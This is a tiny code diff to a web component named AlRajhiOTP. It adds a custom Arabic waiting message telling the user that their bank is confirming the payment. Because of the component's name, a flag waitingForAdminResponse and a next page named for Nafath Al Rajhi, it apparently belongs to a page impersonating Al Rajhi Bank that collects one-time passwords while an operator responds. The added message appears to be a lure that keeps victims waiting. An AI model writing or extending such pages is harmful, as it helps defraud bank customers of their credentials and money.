@@ -70,6 +70,7 @@ export default function AlRajhiOTP() {
       current: "الراجحى (OTP)",
       nextPage: "نفاذ الراجحى",
       waitingForAdminResponse: true,
+      customWaitingMessage: "جاري تأكيد عملية الدفع من قبل المصرف الخاص بك",
     });
   };
 
